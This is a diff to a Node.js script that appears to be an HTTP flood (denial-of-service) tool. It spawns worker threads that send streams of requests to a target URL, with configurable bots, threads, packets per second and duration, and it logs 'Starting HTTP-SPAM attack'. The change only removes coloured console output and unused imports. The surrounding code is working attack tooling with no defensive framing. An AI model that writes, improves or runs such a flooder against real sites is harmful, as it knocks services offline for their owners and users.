@@ -1,8 +1,6 @@
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const { Worker, isMainThread, workerData } = require('worker_threads');
 const http = require('http');
 const https = require('https');
-const chalk = require('chalk');
-const fs = require('fs');
 const url = require('url');
 
 if (isMainThread) {
@@ -15,7 +13,7 @@ if (isMainThread) {
     const parsedUrl = new URL(targetUrl);
     const targetPort = parsedUrl.port || 80;
 
-    console.log(chalk.blueBright(`Starting HTTP-SPAM attack on ${targetUrl} with ${bots} bots, ${threads} threads, ${packetsPerSecond} PPS for ${time} seconds.`));
+    console.log(`Starting HTTP-SPAM attack on ${targetUrl} with ${bots} bots, ${threads} threads, ${packetsPerSecond} PPS for ${time} seconds.`);
 
     for (let i = 0; i < threads; i++) {
         new Worker(__filename, {
@@ -47,7 +45,7 @@ if (isMainThread) {
             });
 
             req.on('error', (err) => {
-                console.error(chalk.red(`Error sending request: ${err.message}`));
+                console.error(`Error sending request: ${err.message}`);
             });
 
             req.end();
@@ -58,6 +56,6 @@ if (isMainThread) {
 
     setTimeout(() => {
         clearInterval(interval);
-        console.log(chalk.greenBright('HTTP-SPAM attack finished.'));
+        console.log('HTTP-SPAM attack finished.');
     }, time * 1000);
 }
